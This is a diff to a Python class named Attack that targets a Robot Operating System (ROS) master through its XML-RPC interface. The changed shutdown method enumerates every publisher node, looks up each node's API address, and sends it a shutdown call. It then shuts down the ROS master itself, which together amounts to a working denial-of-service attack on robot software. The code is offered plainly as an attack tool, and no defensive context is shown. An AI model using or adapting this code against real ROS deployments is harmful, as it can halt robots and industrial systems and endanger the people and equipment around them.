@@ -82,17 +82,19 @@ class Attack:
 	def shutdown(self):
 		#stage1 turn off nodes
 		publishers, subscribers, services = self.proxy.getSystemState("")[2]
-		print "[*]publishers"
-		for i, topic in enumerate(publishers):
-			print "[%d]topic: %s" %(i,topic[0])
-			print "->publisher"
+		node = []
+		for topic in publishers:
 			for topicPublisher in topic[1]:
-				print topicPublisher
-				
+				node.append(topicPublisher)
+		
+		print node
+		node = list(set(node))
+		for tmp in node:
+			#lookup node
+			apiUri = self.proxy.lookupNode(tmp,tmp)[2]
+			NodeProxy = ServerProxy(apiUri)
+			NodeProxy.shutdown("")
+
 		#stage2 turn off master
 		print "[*]turn off ros"
 		self.proxy.shutdown("",)
-
-	def _reinit(self):
-		print "[*]reinit attack"
-		self.proxy._reinit("")
